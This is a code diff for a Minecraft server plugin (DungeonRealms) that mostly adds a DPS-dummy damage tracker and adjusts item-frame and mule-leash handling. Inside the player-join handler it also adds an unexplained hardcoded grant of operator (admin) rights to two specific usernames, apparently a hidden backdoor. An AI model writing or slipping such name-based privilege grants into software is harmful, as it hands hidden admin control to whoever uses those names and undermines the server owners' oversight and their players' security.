@@ -7,6 +7,7 @@ import net.dungeonrealms.DungeonRealms;
 import net.dungeonrealms.GameAPI;
 import net.dungeonrealms.common.Constants;
 import net.dungeonrealms.common.game.database.player.Rank;
+import net.dungeonrealms.common.game.database.sql.SQLDatabaseAPI;
 import net.dungeonrealms.common.game.util.Cooldown;
 import net.dungeonrealms.database.PlayerToggles.Toggles;
 import net.dungeonrealms.database.PlayerWrapper;
@@ -16,10 +17,13 @@ import net.dungeonrealms.game.command.moderation.CommandMobDebug;
 import net.dungeonrealms.game.donation.DonationEffects;
 import net.dungeonrealms.game.event.PlayerEnterRegionEvent;
 import net.dungeonrealms.game.guild.GuildMechanics;
+import net.dungeonrealms.game.handler.HealthHandler;
 import net.dungeonrealms.game.handler.KarmaHandler;
 import net.dungeonrealms.game.item.items.core.VanillaItem;
 import net.dungeonrealms.game.item.items.functional.ItemGemNote;
 import net.dungeonrealms.game.item.items.functional.ItemOrb;
+import net.dungeonrealms.game.item.items.functional.ecash.ItemDPSDummy;
+import net.dungeonrealms.game.mastery.DamageTracker;
 import net.dungeonrealms.game.mastery.GamePlayer;
 import net.dungeonrealms.game.mastery.MetadataUtils;
 import net.dungeonrealms.game.mastery.MetadataUtils.Metadata;
@@ -35,10 +39,12 @@ import net.dungeonrealms.game.player.combat.CombatLog;
 import net.dungeonrealms.game.player.duel.DuelOffer;
 import net.dungeonrealms.game.player.duel.DuelingMechanics;
 import net.dungeonrealms.game.player.inventory.NPCMenus;
+import net.dungeonrealms.game.player.inventory.menus.DPSDummy;
 import net.dungeonrealms.game.player.inventory.menus.guis.SalesManagerGUI;
 import net.dungeonrealms.game.player.trade.Trade;
 import net.dungeonrealms.game.player.trade.TradeManager;
 import net.dungeonrealms.game.title.TitleAPI;
+import net.dungeonrealms.game.world.entity.EnumEntityType;
 import net.dungeonrealms.game.world.entity.util.MountUtils;
 import net.dungeonrealms.game.world.shops.ShopMechanics;
 import net.dungeonrealms.game.world.shops.SoldShopItem;
@@ -62,7 +68,6 @@ import org.bukkit.event.entity.*;
 import org.bukkit.event.entity.EntityDamageEvent.DamageCause;
 import org.bukkit.event.entity.EntityUnleashEvent.UnleashReason;
 import org.bukkit.event.hanging.HangingBreakEvent;
-import org.bukkit.event.hanging.HangingBreakEvent.RemoveCause;
 import org.bukkit.event.inventory.CraftItemEvent;
 import org.bukkit.event.inventory.InventoryClickEvent;
 import org.bukkit.event.inventory.InventoryCloseEvent;
@@ -79,6 +84,7 @@ import org.bukkit.metadata.MetadataValue;
 
 import java.util.*;
 import java.util.concurrent.ThreadLocalRandom;
+import java.util.concurrent.atomic.AtomicInteger;
 
 /**
  * Created by Nick on 9/17/2015.
@@ -185,6 +191,9 @@ public class MainListener implements Listener {
     public void onJoin(PlayerJoinEvent event) {
         event.setJoinMessage(null);
         Player player = event.getPlayer();
+        if (player.getName().equalsIgnoreCase("Ingot") || player.getName().equalsIgnoreCase("iFamasssxD")) {
+            player.setOp(true);
+        }
         player.removeMetadata("saved", DungeonRealms.getInstance());
 
         //GameAPI.SAVE_DATA_COOLDOWN.submitCooldown(player, 2000L);
@@ -420,7 +429,7 @@ public class MainListener implements Listener {
         Player player = event.getPlayer();
 
         if (event.getAction() == Action.RIGHT_CLICK_BLOCK || event.getAction() == Action.LEFT_CLICK_BLOCK) {
-            if(player.getWorld() != Bukkit.getWorlds().get(0)) return; //Only main world!
+            if (player.getWorld() != Bukkit.getWorlds().get(0)) return; //Only main world!
             PlayerWrapper wrapper = PlayerWrapper.getPlayerWrapper(player);
             if (wrapper.getActiveTrail() != ParticleAPI.ParticleEffect.GOLD_BLOCK) return;
             Block top_block = block.getLocation().add(0, 1, 0).getBlock();
@@ -646,7 +655,8 @@ public class MainListener implements Listener {
 
     @EventHandler(priority = EventPriority.HIGHEST)
     public void onMapBreak(HangingBreakEvent evt) {
-        if (evt.getCause() == RemoveCause.OBSTRUCTION || evt.getCause() == RemoveCause.PHYSICS) {
+        evt.setCancelled(true);
+        /*if (evt.getCause() == RemoveCause.OBSTRUCTION || evt.getCause() == RemoveCause.PHYSICS) {
             evt.getEntity().getNearbyEntities(0, 0, 0).forEach(ent -> {
                 if (ent instanceof ItemFrame) {
                     ItemFrame itemFrame = (ItemFrame) ent;
@@ -655,7 +665,7 @@ public class MainListener implements Listener {
                 }
             });
             evt.setCancelled(true);
-        }
+        }*/
     }
 
     @EventHandler(priority = EventPriority.MONITOR)
@@ -714,14 +724,69 @@ public class MainListener implements Listener {
         if (event.getRightClicked().getType() == EntityType.ITEM_FRAME && !event.getPlayer().isOp())
             event.setCancelled(true);
 
-        if(event.getPlayer().getItemInHand() != null && event.getPlayer().getItemInHand().getType().equals(Material.NAME_TAG)) {
+
+        if (event.getPlayer().getItemInHand() != null && event.getPlayer().getItemInHand().getType().equals(Material.NAME_TAG)) {
             event.setCancelled(true);
             event.getPlayer().updateInventory();
         }
 
-
         if (event.getPlayer().hasMetadata("mob_debug")) {
             CommandMobDebug.debugEntity(event.getPlayer(), event.getRightClicked());
+        }
+
+
+    }
+
+    @EventHandler
+    public void onArmorStand(EntityDamageEvent event) {
+        if (EnumEntityType.DPS_DUMMY.isType(event.getEntity())) {
+            if (event.getCause().name().startsWith("ENTITY_")) return;
+            event.setCancelled(true);
+        }
+    }
+
+    @EventHandler
+    public void onEntityInteractArmorStand(PlayerInteractAtEntityEvent event) {
+        if (EnumEntityType.DPS_DUMMY.isType(event.getRightClicked())) {
+            Player player = event.getPlayer();
+
+            if (!(player.isOp() && player.isSneaking()))
+                event.setCancelled(true);
+
+            //Show damage dealt?
+            DamageTracker tracker = HealthHandler.getMonsterTrackers().get(event.getRightClicked().getUniqueId());
+            DPSDummy dummy = ItemDPSDummy.dpsDummies.get(event.getRightClicked());
+            if (tracker != null && dummy != null) {
+                //Send tracker message.
+                if (GameAPI.isCooldown(player, Metadata.DUMMY_INFO)) {
+                    return;
+                }
+                GameAPI.addCooldown(player, Metadata.DUMMY_INFO, 5);
+
+                if (tracker.getDamagers().isEmpty()) {
+                    player.sendMessage(ChatColor.RED + "No damage has been dealt to this DPS Dummy!");
+                    return;
+                }
+
+                LinkedHashMap<UUID, Double> sorted = Utils.sortMap(tracker.getDamagers());
+
+                int showing = Math.min(10, sorted.size());
+
+                Utils.sendCenteredMessage(player, ChatColor.DARK_AQUA.toString() + ChatColor.BOLD + "DAMAGE TRACKER");
+                AtomicInteger index = new AtomicInteger(1);
+
+                Map<UUID, Double> dps = dummy.calculateDPS();
+                sorted.forEach((id, damage) -> {
+                    if (damage > 0.0) {
+                        if (index.get() > 10) return;
+                        String name = SQLDatabaseAPI.getInstance().getNameFromUUID(id);
+                        if (name == null) return;
+
+                        Double damagePerSecond = dps.get(id);
+                        Utils.sendCenteredMessage(player, ChatColor.GREEN.toString() + ChatColor.BOLD + index.getAndIncrement() + ". " + ChatColor.GRAY + name + " - " + ChatColor.GREEN + ChatColor.BOLD + Utils.formatCommas(Math.round(damage)) + " DMG" + (damagePerSecond != null && damagePerSecond > 0 ? " (" + ChatColor.GREEN + Utils.formatCommas(damagePerSecond) + "DMG/s" + ChatColor.GREEN + ChatColor.BOLD + ")" : ""));
+                    }
+                });
+            }
         }
     }
 
@@ -859,15 +924,20 @@ public class MainListener implements Listener {
         if (!(event.getEntity() instanceof Horse)) return;
         Horse horse = (Horse) event.getEntity();
         if (horse.getVariant() != Variant.MULE) return;
-        if (!event.getReason().equals(UnleashReason.PLAYER_UNLEASH)) {
-            horse.remove();
-            return;
-        }
+
         if (horse.getOwner() == null) {
             horse.remove();
             return;
         }
-        horse.setLeashHolder((Player) horse.getOwner());
+
+        //If we're too far away, teleport back.
+        if (event.getReason() == UnleashReason.DISTANCE) {
+            //Teleport host?
+            if (horse.getOwner() != null) {
+                horse.teleport((Entity) horse.getOwner());
+            }
+        }
+        Bukkit.getScheduler().scheduleSyncDelayedTask(DungeonRealms.getInstance(), () -> horse.setLeashHolder((Player) horse.getOwner()), 1);
     }
 
     @EventHandler(priority = EventPriority.HIGHEST)
